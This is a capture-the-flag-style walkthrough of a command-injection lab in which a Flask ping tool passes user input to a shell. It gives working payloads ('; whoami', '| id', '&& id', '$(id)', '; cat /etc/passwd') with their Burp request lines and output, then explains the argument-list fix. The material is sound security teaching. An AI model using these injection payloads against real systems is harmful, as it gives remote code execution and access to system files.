# Walkthrough — command-injection-basic

## 1. Context

The app is a "network ping tool." You type a host on `/`, the form submits a `GET /ping?host=<host>` request, and the server runs `ping -c 1 <host>` and shows you the command's output — the kind of reachability check you find in admin panels and status pages everywhere.

Unlike XSS, this one is worked entirely in Burp. The command runs on the server and its output comes straight back in the HTTP response, so there is nothing to execute in a browser — you see `root`, or `/etc/passwd`, right there in the Repeater response pane.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/ping` view builds its command like this:

```python
host = request.args.get("host", "")
# VULNERABLE: user input concatenated into a shell command string
cmd = f"ping -c 1 {host}"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
output = result.stdout + result.stderr
```

The `host` value comes straight from the query string and is pasted into a command string with an f-string. That string is then handed to `subprocess.run(..., shell=True)` — and `shell=True` means Python runs it as `/bin/sh -c "ping -c 1 <host>"`. A shell doesn't just run `ping`; it *parses* the whole line first, honoring every metacharacter it finds — `;`, `|`, `&&`, `$(...)`, backticks. Whatever the client sends after `ping -c 1 ` becomes part of a shell program.

This is the same source → sink audit as the other injection atoms, pointed at a new interpreter. The cheap first-pass grep here is `shell=True`, `os.system(`, `os.popen(`:

```bash
grep -rn 'shell=True\|os.system(\|os.popen(' .
```

Two things the app does *right*, so you don't confuse them with the bug:

- **The output is HTML-escaped.** `result.html` renders `<pre>{{ output }}</pre>` through Jinja's default autoescape (no `|safe`). If it didn't, a payload like `; echo '<script>...'` would turn the command output into live HTML — a reflected XSS stacked on top of the command injection. Escaping the output keeps this atom to exactly one bug. It is *not* the command-injection fix.
- **The 10-second timeout is hygiene, not defense.** `subprocess.run(..., timeout=10)` inside a `try/except subprocess.TimeoutExpired` means a `; sleep 999` or a `; cat` (which blocks on stdin) dies after 10s with `command timed out after 10s` instead of hanging the lab. It is orthogonal to the vulnerability and the fix, and it is identical in both versions — a `; whoami` returns in milliseconds, nowhere near the limit.

The `/ping` view also echoes the assembled command back in a debug `<pre>`, which makes this lab easy to follow — in a real app you'd infer the command shape from behavior.

## 3. Exploitation via Burp Suite (primary track)

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8009/>, submit `127.0.0.1` through the form once to capture the traffic, then right-click the `GET /ping?host=127.0.0.1` request in **Proxy → HTTP history** and choose **Send to Repeater**.

### Baseline — the tool doing its job

Send the captured request as-is and read the response. The "Executed command" block shows `ping -c 1 127.0.0.1`, and the output is an ordinary ping (your times will vary):

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
```

That is the feature working as intended. Now subvert it.

### A note on URL encoding

Two characters bite when you put a shell payload in the query string:

- **Spaces must be `%20`.** HTTP request lines are `METHOD SP URI SP VERSION` — a literal space inside the URI makes the server see four tokens and reply **400 Bad Request** before your command ever runs. `; whoami` goes on the wire as `;%20whoami`.
- **`&` must be `%26`.** A raw `&` in a query string *starts a new parameter*: `?host=127.0.0.1 && id` would be split, `host` would end at `127.0.0.1 `, and your injection would fall apart. To chain with `&&`, send `%26%26`. (This is the trap of this atom, the way `+`→`%2B` is the trap in a form body.)

The other metacharacters — `;`, `|`, `$`, `(`, `)` — travel fine in the query value and the steps below show them raw for readability. If your setup is strict, or you just don't want to think about it, paste the decoded payload into Repeater, select it, and press **Ctrl+U**: Burp encodes everything, `&` and spaces included. Each step shows a **Payload** (decoded, for reading) and a **Request line** (ready to paste).

### Step 1 — Confirm the injection point

Payload:

```
127.0.0.1; whoami
```

Request line in Repeater:

```
GET /ping?host=127.0.0.1;%20whoami HTTP/1.1
Host: 127.0.0.1:8009
```

Response — the "Executed command" block shows your input became the command line, and the output carries both the ping *and* a second command's result:

```
Executed command:
ping -c 1 127.0.0.1; whoami

Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
root
```

There it is — `root`. The `;` ended the `ping` command and the shell ran `whoami` as a second command. Your input was not data; it was **code for the shell**. (And `root` is not a typo: the container runs as root, so your command runs with full privilege — more on that in Step 3.)

### Step 2 — It's not the semicolon: the shell is the sink

The natural wrong conclusion is "the app should have blocked the `;`." It shouldn't matter which character you use — the whole *shell* is parsing your input as code. Prove it with three different metacharacters, none of them a semicolon:

**Pipe** — `ping`'s output is piped into `id` (which ignores stdin and prints identity):

```
Payload:       127.0.0.1 | id
Request line:  GET /ping?host=127.0.0.1%20|%20id HTTP/1.1

Output:
uid=0(root) gid=0(root) groups=0(root)
```

**AND list** — `id` runs after `ping` succeeds. Note the `&&` **must** be sent as `%26%26`:

```
Payload:       127.0.0.1 && id
Request line:  GET /ping?host=127.0.0.1%20%26%26%20id HTTP/1.1

Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
... ping statistics ...
uid=0(root) gid=0(root) groups=0(root)
```

**Command substitution** — the shell runs `$(id)` first and splices its output into the argument:

```
Payload:       127.0.0.1$(id)
Request line:  GET /ping?host=127.0.0.1$(id) HTTP/1.1

Output:
ping: groups=0(root): Name or service not known
```

That last one is worth reading closely: `ping` never resolves a host, yet `groups=0(root)` — a fragment of `id`'s output — appears in its error. The shell executed `$(id)` *before* `ping` ran and pasted the result into the hostname; `ping` then failed on the mangled name. The command still ran.

`;`, `|`, `&&`, `$(...)` — four characters, one root cause: the shell interprets attacker input as code. Blocking one character just moves the attacker to the next. In `sqli-union-basic` the lesson was "escaping quotes is a losing game — parameterize"; here it is "escaping metacharacters is a losing game — drop the shell." Section 5 does exactly that.

### Step 3 — Full command execution: read an arbitrary file

Chaining `whoami` proves execution. Reading a file proves reach — the attacker runs any command the server user can:

```
Payload:       127.0.0.1; cat /etc/passwd
Request line:  GET /ping?host=127.0.0.1;%20cat%20/etc/passwd HTTP/1.1
```

The output carries the ping, then the container's entire `/etc/passwd`:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
... ping statistics ...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**What this really is.** Here the command runs inside a throwaway, isolated container, so reading `/etc/passwd` as `root` is harmless — that isolation is the safety net for this lab. On a real target this is **Remote Code Execution**: the attacker runs arbitrary commands as the server user, on the server's machine. That is the top of the injection-severity scale — the innocuous `whoami`/`cat` here stands in for full control of the host. Keep your payloads demonstrative (read a file, print an id); there is never a reason to reach for `rm -rf`, a fork bomb, or anything destructive, even in a container.

### Why this is command injection (and how it compares to SQLi and XSS)

In `sqli-union-basic` the unsanitized input flowed into the **SQL engine**, and the attacker read **data** out of the database. In the XSS atoms it flowed into the **browser's HTML/JS parser**, and the code ran in the **victim's browser**. Here it flows into the **OS shell**, and the command runs **on the server itself**: `whoami` returns `root`, `cat /etc/passwd` hands back the file. Same root cause all three times — input concatenated into a string that an interpreter parses — but the interpreter is now the shell, and the result is Remote Code Execution: the worst case of the family. And the fix rhymes with the SQLi one: just as the parameterized query separated SQL from data, an argument list separates the command from its argument, taking the shell out of the loop entirely.

## 4. Exploitation via browser (secondary track, optional)

The same payloads work straight from the form on `/` (or pasted into the address bar):

1. `http://127.0.0.1:8009/ping?host=127.0.0.1; whoami`
2. `http://127.0.0.1:8009/ping?host=127.0.0.1; cat /etc/passwd`

The browser URL-encodes spaces (and the rest) for you before sending, so the raw forms paste cleanly — the `%26` trap only bites when you craft the request by hand in Burp. The "Executed command" block on each result page makes the source → sink path explicit without any tooling. Use this for the first read-through; switch to Burp when you want byte-level control over the payload, which is how you'd work a real target.

## 5. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. In short: the fixed version calls `subprocess.run(["ping", "-c", "1", host])` — an argument list with no `shell=True`. Python hands those exact items to `execvp` and the kernel runs `ping` directly; **no `/bin/sh` is spawned to parse anything.** `host` is always a single, inert argument to `ping`, so `127.0.0.1; whoami` becomes one literal "hostname" that `ping` tries to resolve and can't:

```
ping: 127.0.0.1; whoami: Name or service not known
```

Run every payload from section 3 against <http://127.0.0.1:8109/ping> to confirm: each returns `ping: <your input>: Name or service not known`, no second command executes, nothing leaks. Escaping or blocklisting metacharacters would be a losing game — the fix is to never let a shell see the input at all. Input validation (an allowlist like `^[a-zA-Z0-9.-]+$`) is worth adding as defense-in-depth — it also blocks a leading `-` that could turn into `ping` argument injection — but it is a second layer, not the fix; `DIFF.md` covers why.
